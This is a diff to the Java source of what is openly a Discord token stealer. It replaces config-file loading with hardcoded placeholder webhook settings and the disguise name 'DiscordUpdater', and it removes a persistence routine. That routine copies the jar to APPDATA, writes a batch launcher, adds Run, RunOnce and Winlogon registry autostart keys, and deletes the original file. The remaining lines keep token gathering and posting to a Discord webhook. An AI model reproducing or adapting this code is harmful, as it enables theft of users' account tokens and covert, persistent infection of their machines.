@@ -11,8 +11,8 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Main {
-    private static boolean debug = true; // Whether or not everyting should be displayed on terminal window
-    private static boolean output = true; // Whether or not everyting should be written to a file
+    private static boolean debug = false; // Whether or not everyting should be displayed on terminal window
+    private static boolean output = false; // Whether or not everyting should be written to a file
     private static BufferedWriter writer;
     private static StringBuilder final_text = new StringBuilder();
 
@@ -30,44 +30,23 @@ public class Main {
         // IMPORTANT: Not tested on MacOS or Linux (hopefully works)
 
         String s = null;
-        StringBuilder configFileString = new StringBuilder();
-        InputStream in = Main.class.getResourceAsStream("webhook.txt");
-        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
-        while ((s = reader.readLine()) != null) {
-            configFileString.append(s).append("\n");
-        }
+
 
         //Settings:
-        String hideAs = getJsonKey(configFileString.toString(), "hide_As"); //What the registry entry should be called.
-        String discord_avatar_url = getJsonKey(configFileString.toString(), "discord_avatar_url"); //If you want to change the webhook icon
-        String discord_username = getJsonKey(configFileString.toString(), "discord_username"); //Webhook Name (only when embed)
-        String discord_webhook_url = getJsonKey(configFileString.toString(), "discord_webhook_url"); // args[0]; //Change this
-        boolean send_embed = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "send_embed")); //True sends embed, False sends it in text
-        boolean ensure_valid = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "ensure_valid")); //Checks the account before sending (removes if invalid)
-        boolean randomize_new_name = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "randomize_new_name")); //Whether or not a random string shoud be set as the file name
-        boolean shouldPersist = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "shouldPersist"));
-        debug = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "debug")); //True sends embed, False sends it in text
-        output = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "write_to_file")); //True sends embed, False sends it in text
-
-        if (output) {
-            if (!new File("output\\output.txt").exists()) {
-                File folder = new File("output");
-                folder.mkdir();
-                File f = new File("output", "output.txt");
-                folder.createNewFile();
-            }
-        }
+        String hideAs = "DiscordUpdater"; //What the registry entry should be called.
+        String discord_avatar_url = "your_avatar_url_here"; //If you want to change the webhook icon
+        String discord_username = "your_webhook_name_here"; //Webhook Name (only when embed)
+        String discord_webhook_url = "your_webhook_url_here"; // args[0]; //Change this
+        boolean send_embed = true; //True sends embed, False sends it in text
+        boolean ensure_valid = true; //Checks the account before sending (removes if invalid)
+        debug = false; //True sends embed, False sends it in text
+        output = false; //True sends embed, False sends it in text
 
         if (!(args.length > 0)) {
             if (System.getProperty("os.name").contains("Windows")) {
                 String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
                 String decodedPath = URLDecoder.decode(path, "UTF-8");
                 String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];
-
-                //Mini
-                if (shouldPersist) {
-                    miniPersistence(randomize_new_name, hideAs);
-                }
 
                 //Gatherer
                 for (String token : getTokens(ensure_valid)) {
@@ -78,13 +57,6 @@ public class Main {
             }
         }
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-        //Write Output to File
-        if (output) {
-            Path path = new File("output","output.txt").toPath();
-            byte[] strToBytes = final_text.toString().getBytes();
-
-            Files.write(path, strToBytes);
-        }
     }
 
     private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
@@ -292,133 +264,6 @@ public class Main {
             print("POST - "+connection.getResponseCode());
         }
 
-    }
-
-    private static void miniPersistence(boolean randomize_new_name, String hideAs) throws Exception {
-        String new_name;
-        String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-        String decodedPath = URLDecoder.decode(path, "UTF-8");
-        String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];
-        if (randomize_new_name) {
-            new_name = UUID.randomUUID().toString().substring(16) + ".jar";
-        } else {
-            new_name = hideAs;
-            if (!new_name.contains(".jar")) {
-                new_name = new_name + ".jar";
-            }
-
-        }
-
-
-        if (file_name.contains(".jar")) {
-            //Make sure there is a file in roaming that does what we do
-            try {
-                try (OutputStream out = new FileOutputStream(new File(System.getenv("APPDATA"), new_name))) {
-                    Files.copy(new File(System.getProperty("user.dir"), file_name).toPath(), out);
-                    out.flush();
-                } catch (IOException i) {
-                }
-
-            } catch (ArrayIndexOutOfBoundsException e) {
-                copyFileTo(new File(System.getProperty("user.dir"), file_name), new File(System.getenv("APPDATA"), new_name));
-            }
-
-            if (new File(System.getenv("APPDATA"), new_name).exists()) {
-                //Copy file to startup
-                //String startup_path = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup";
-                //copyFileTo(new File(System.getenv("APPDATA"), new_name), new File(startup_path));
-                String batch_file = new_name + ".bat";
-                writeToFile(new File("@echo off & java -jar " + batch_file + " & exit"), "@echo off & java -jar " + new_name + " & exit");
-
-                String[] reg_start = {
-                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                };
-                Process proc = Runtime.getRuntime().exec(reg_start[0]);
-                proc.destroy();
-                for (int i = 1; i < reg_start.length; i++) {
-                    final boolean[] done = new boolean[1];
-                    int finalI = i;
-                    Thread thread = new Thread() {
-                        public void run() {
-                            if (debug) {
-                                print("Executing command: " + reg_start[finalI]);
-                            }
-                            try {
-                                Process proc = Runtime.getRuntime().exec(reg_start[finalI]);
-
-                                BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-                                String s = null;
-                                while ((s = stdInput.readLine()) != null) {
-                                    if (s.equalsIgnoreCase("The operation completed successfully.")) {
-                                        print("Successfulyy added to registry");
-                                        proc.destroy();
-                                        done[0] = true;
-                                    }
-                                }
-
-                                if (proc.isAlive()) {
-                                    print("Failed to add to registry");
-                                    proc.destroy();
-                                }
-                            } catch (Exception e) {
-                                if (debug) {
-                                    print(e.getMessage());
-                                }
-                            }
-                        }
-                    };
-                    thread.start();
-                    if (done[0]) {
-                        thread.stop();
-                    }
-
-
-                }
-            }
-
-            if (new File(file_name).exists()) {
-                if (new File(file_name).delete()) {
-                    System.exit(1);
-                }
-            }
-        }
-    }
-
-    private static void writeToFile(File file, String text) throws IOException {
-        Files.write(file.toPath(), Collections.singleton(text));
-    }
-
-    private static boolean copyFileTo(File f1, File f2) throws IOException {
-        InputStream is = null;
-        OutputStream os = null;
-        try {
-            is = new FileInputStream(f1);
-            os = new FileOutputStream(f2);
-            byte[] buffer = new byte[1024];
-            int length;
-            long finalLength = 0;
-            while ((length = is.read(buffer)) > 0) {
-                os.write(buffer, 0, length);
-                finalLength = finalLength + length;
-                if (debug) {
-                    print("Moving " + length + "bytes to " + f2.getPath() + " | " + finalLength);
-                }
-
-            }
-        } finally {
-            if(is!=null&&os!=null){
-                is.close();
-                os.close();
-            }
-
-        }
-
-        return f2.exists();
     }
 
     private static String getJsonKey(String jsonString, String wantedKey) {
